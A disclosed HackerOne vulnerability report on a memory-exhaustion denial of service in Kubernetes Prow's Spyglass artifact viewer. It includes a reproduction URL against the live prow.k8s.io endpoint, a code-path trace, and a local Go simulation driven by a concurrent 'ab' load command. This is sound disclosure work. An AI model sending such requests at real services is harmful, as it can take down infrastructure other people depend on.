# DoS for GCSArtifact.RealAll

## Report Details
- **Report ID**: 833856
- **URL**: https://hackerone.com/reports/833856
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-03-29T12:30:23.076Z
- **Disclosed**: 2021-02-04T19:00:04.236Z

## Reporter
- **Username**: lazydog
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
Hi,
I'm not be goot at english,
if have anything don’t understand, please contact me.

Thanks!

## Summary:
attackers can control artifactName list make google storage client download large object cause denial of service.
## Component Version:
kubenetes/test-infra:master(SHA:fea5af139ecdac00e5efa46539bc80bd0f9e951c)

## Steps To Reproduce:
  1. request this url, we can see the http response is slowly.so i analyze the code process flow.
```
https://prow.k8s.io/spyglass/lens/buildlog/rerender?req={"artifacts":["k8s-test-cache.tar.gz"],"index":0,"src":"gcs/kubernetes-jenkins/cache/poc/"}
```{F764935}
  2. in "/spyglass/lens/" endpoint handle function, we can control the req.artifacts params make google storage client download a large object in memory. the vuln code flow like this:

```
test-infra/prow/cmd/deck/main.go:702  func handleArtifactView() ->
test-infra/prow/cmd/deck/main.go:1151 sg.FetchArtifacts(..., request.Artifacts) ->
test-infra/prow/spyglass/artifacts.go:119 s.GCSArtifactFetcher.artifact(..., artifactname) ->
etc..(path process, url sign)
test-infra/prow/cmd/deck/main.go:1175 lens.Body(artifacts) ->
test-infra/prow/spyglass/lenses/buildlog/lens.go:190 logLinesAll(artifact) ->
test-infra/prow/spyglass/lenses/buildlog/lens.go:213 artifact.ReadAll() ->
test-infra/prow/spyglass/gcsartifact.go:205 ioutil.ReadAll(reader)
```
{F764922}
  3.ensure prow infra is not interrupted, i write the simple code to simulation the vuln code, and use `ab -n 30 -c 30 http://localhost:8090/download` command concurrent request website.
```
package main

import (
    "net/http"
    "fmt"
    "io/ioutil"
    "strings"
)

func client() (r *http.Response, err error){
    var res *http.Response
    var hc = &http.Client{}
    // req, err := http.NewRequest("GET", "https://storage.googleapis.com/kubernetes-jenkins/cache/poc/k8s-test-cache.tar.gz", nil)
    req, err := http.NewRequest("GET", "http://localhost/10MB.BIN", nil)
    if err != nil {
        return nil, err
    }

    res, err = hc.Do(req)
    if err != nil {
        return nil, err
    }

    return res, nil
}

func download(w http.ResponseWriter, req *http.Request) {
    res, err := client()
    if err != nil {
        fmt.Fprintf(w, "err")
    }

    defer res.Body.Close()

    read, err := ioutil.ReadAll(res.Body)
    if err != nil {
        fmt.Fprintf(w, "err")
    }

    lines := strings.Split(string(read), "\n")
    data := strings.Join(lines, "")
    fmt.Fprintf(w, data)
}

func main() {
    http.HandleFunc("/download", download)

    http.ListenAndServe(":8090", nil)
}
```
result:
{F764944}

4.i think concurrent request the prow spyglass endpoint  also make server out of memory.

## Impact

attacker can send HTTP request to the prow can cause an a denial of service by control the fetcher download large object.

## Attachments
- ReadAll.png
- slowly.png
- oom.png
